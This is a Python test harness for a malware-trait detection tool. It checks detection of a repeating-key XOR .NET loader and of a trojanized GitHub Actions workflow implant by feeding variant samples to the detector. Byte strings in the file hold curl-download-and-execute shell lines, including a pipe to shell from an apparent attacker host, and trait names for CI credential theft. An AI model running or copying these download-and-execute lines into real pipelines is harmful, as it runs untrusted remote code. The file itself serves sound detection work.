#!/usr/bin/env python3
"""Check retained payload coverage and neutral deployment without execution."""
import argparse
from concurrent.futures import ThreadPoolExecutor
import json
from pathlib import Path
import subprocess
import tarfile
import tempfile

parser = argparse.ArgumentParser()
parser.add_argument('--samples', type=Path, required=True)
parser.add_argument('--scratch', type=Path, required=True)
parser.add_argument('--cleave', default='cleave')
args = parser.parse_args()
repo = Path(__file__).resolve().parents[3]
xor = 'micro-behaviors/data/encoding/xor::cil-repeating-key-byte-array-xor-loop'
loader = 'objectives/execution/payload/module-load::dotnet-bitmap-resource-entrypoint-loader'
signer = 'objectives/evasion/masquerade/trust::microsoft-signed-bitmap-assembly-loader'
deploy = 'micro-behaviors/process/deploy/interpreter-stdin::gha-download-shell-pipeline'
file_exec = 'micro-behaviors/process/deploy/file-exec::shell-downloaded-file-invocation'
hidden = 'objectives/command-and-control/dropper/delivery/hidden-stage::hidden-download-shell-execution'
append = 'objectives/supply-chain/trojanized/ci-pipeline::cache-gated-workflow-shell-append'
implant = 'objectives/supply-chain/trojanized/ci-pipeline::action-cache-gated-workflow-shell-implant'
retired = {
    'objectives/evasion/masquerade/versioninfo::unsubstantiated-vendor-claim-fake-packer',
    'objectives/supply-chain/hidden-payload/ci::gha-remote-shell-stage',
    'objectives/command-and-control/dropper/staging/runtime::dotnet-bitmap-resource-entrypoint-loader',
    'micro-behaviors/process/create/script/file::shell-downloaded-file-invocation',
}

with tempfile.TemporaryDirectory(prefix='fallout-coverage-', dir=args.scratch) as work:
    work = Path(work)
    original = (args.samples / '75132a602fda/payload.exe').read_bytes()
    cases = []

    def case(name, data, required=(), forbidden=(), benign=False):
        path = work / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        cases.append((path, set(required), set(forbidden), benign))

    case('renamed.exe', original, [xor, loader, signer])
    needle = bytes.fromhex('03 07 03 8e 69 5d 91 61 d2 9c')
    assert original.count(needle) == 1
    case('and-transform.exe', original.replace(needle, needle.replace(b'\x61', b'\x5f')),
         [loader, signer], [xor])
    case('non-repeating-transform.exe', original.replace(needle, needle.replace(b'\x5d', b'\x5b')),
         [loader, signer], [xor])
    case('graphics-utility.exe',
         (repo / 'testdata/taxonomy/managed-utility-command-references/hbitmap.exe').read_bytes(),
         forbidden=[xor, loader, signer])
    case('same-path.sh', b'curl -fsSL https://downloads.vendor.invalid/start.sh -o stage.sh\nbash stage.sh\n',
         [file_exec], benign=True)
    case('different-path.sh', b'curl -fsSL https://downloads.vendor.invalid/start.sh -o stage.sh\nbash other.sh\n',
         forbidden=[file_exec], benign=True)
    case('opposite-branches.sh', b'if condition; then\ncurl -fsSL https://downloads.vendor.invalid/start.sh -o stage.sh\nelse\nbash stage.sh\nfi\n',
         forbidden=[file_exec], benign=True)
    case('concealed-stage.sh', b'curl -fsSL https://downloads.vendor.invalid/start.sh -o /tmp/.stage.sh\nbash /tmp/.stage.sh\n',
         [file_exec, hidden])
    cases.append((repo / 'testdata/benign/gha-pipe-stage-controls.tar', {deploy, file_exec}, set(), True))
    cases.append((repo / 'testdata/hostile/supply-chain-corpus/gha/gha-junipeerlite-registry-cred-theft-linux.tgz',
                  {'objectives/supply-chain/hidden-payload/ci::gha-registry-credential-upload'}, set(), False))
    workflow_fixture = repo / 'testdata/hostile/supply-chain-corpus/gha/gha-marrowworks-workflow-inject-linux.tgz'
    with tarfile.open(workflow_fixture) as archive:
        action = archive.extractfile('marrowworks/action.yml').read()
    case('implant-positive/action.yml', action, [append, implant])
    renamed = action.replace(b'307aa0', b'other-flag').replace(b'ci.yml', b'build.yml')
    renamed = renamed.replace(b'monolit-sync.net/hook/other-flag', b'downloads.vendor.invalid/stage')
    renamed = renamed.replace(b'$Y', b'$TARGET').replace(b'Y="', b'TARGET="')
    case('implant-renamed/action.yml', renamed, [append, implant])
    for name, before, after in [
        ('other-target', b'.github/workflows/', b'.github/settings/'),
        ('other-variable', b'>> "$Y"', b'>> "$OTHER"'),
        ('other-checked-variable', b'-f "$Y"', b'-f "$OTHER"'),
        ('ordinary-gate', b'$HOME/.cache/', b'$HOME/settings/'),
        ('overwrite', b'cat >>', b'cat >'),
        ('harmless-step', b'run: curl -fsSL https://monolit-sync.net/hook/307aa0 | sh', b'run: echo completed'),
    ]:
        assert before in action
        # Ablations test the relationship; they do not relabel the whole
        # altered program benign or suppress any independent detections.
        case('implant-' + name + '/action.yml', action.replace(before, after), forbidden=[append, implant])

    def run(case):
        path, required, forbidden, benign = case
        proc = subprocess.run([args.cleave, '--traits-dir', str(repo), '--format', 'json', str(path)],
                              capture_output=True, text=True, check=True, timeout=180)
        report = json.loads(proc.stdout)
        traits = {t['id']: t['crit'] for f in report['files'] for t in f.get('traits', [])}
        assert required <= traits.keys(), (path.name, required - traits.keys())
        assert not (forbidden | retired) & traits.keys(), (path.name, (forbidden | retired) & traits.keys())
        if benign:
            assert not [t for t, crit in traits.items() if crit >= 4], (path.name, traits)
        if deploy in traits:
            assert traits[deploy] == 3
        print(path.name + ': PASS', flush=True)

    with ThreadPoolExecutor(max_workers=3) as pool:
        list(pool.map(run, cases))
